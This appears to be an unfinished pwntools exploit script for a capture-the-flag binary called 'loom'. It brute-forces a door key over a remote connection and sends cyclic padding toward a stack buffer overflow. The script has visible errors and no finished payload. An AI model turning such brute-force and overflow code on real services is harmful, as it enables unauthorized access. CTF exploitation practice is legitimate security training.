
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template loom --host 0.cloud.chals.io --port 33616
from pwn import *
from tqdm import tqdm

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'loom')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '0.cloud.chals.io'
port = int(args.PORT or 33616)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
init-peda
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

DIC = string.ascii_lowercase + string.digits

def get_key():
    GDB = args.GDB
    args.GDB = False
    io = start_remote()
    for i in tqdm(range(1, 26)):
        for key in iters.combinations_with_replacement(DIC, i):
            while True:
                try:
                    io.sendlineafter(b"> ", b"3")
                    io.sendlineafter(b"> ", ("".join(key)).encode())
                    if b"The door does not open" not in io.recvlines(2)[1]:
                        io.close()
                        args.GDB = GDB
                        return "".join(key)
                    break
                except EOFError:
                    io.close()
                    io = start_remote()

context.log_level = "debug"

io = start()

padding = 286

payload = flat([
    cyclic(padding),
])

io.sendlineafter(b"1")
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"> ", payload)

io.interactive()